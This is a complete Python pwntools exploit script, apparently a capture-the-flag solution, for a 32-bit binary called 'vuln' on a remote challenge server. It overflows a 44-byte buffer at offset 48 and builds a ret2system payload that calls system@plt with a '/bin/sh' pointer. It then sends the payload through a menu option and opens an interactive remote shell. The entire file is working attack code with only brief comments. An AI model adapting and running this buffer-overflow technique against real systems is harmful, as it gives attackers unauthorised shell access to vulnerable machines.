#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

# Configuration
HOST = 'chall.0xfun.org'
PORT = 63809

elf = ELF('./vuln', checksec=False)

# Addresses
system_plt = elf.plt['system']
binsh = next(elf.search(b'/bin/sh\x00'))

log.info(f"system@plt: {hex(system_plt)}")
log.info(f"/bin/sh: {hex(binsh)}")

# Buffer overflow offset
# Buffer at ebp-0x2c (44 bytes) + 4 bytes saved ebp
offset = 48

# Build payload: padding + system + fake_ret + arg1(/bin/sh)
payload = flat(
    b'A' * offset,
    system_plt,
    0xdeadbeef,  # return address (unused)
    binsh        # argument for system()
)

log.info(f"Payload length: {len(payload)}")

# Connect to server
p = remote(HOST, PORT)

# Navigate menu
p.recvuntil(b'>')
p.sendline(b'2')  # Option 2: Set welcome message

p.recvuntil(b':')
p.sendline(payload)

# Shell obtained
log.success("Shell obtained!")
p.interactive()
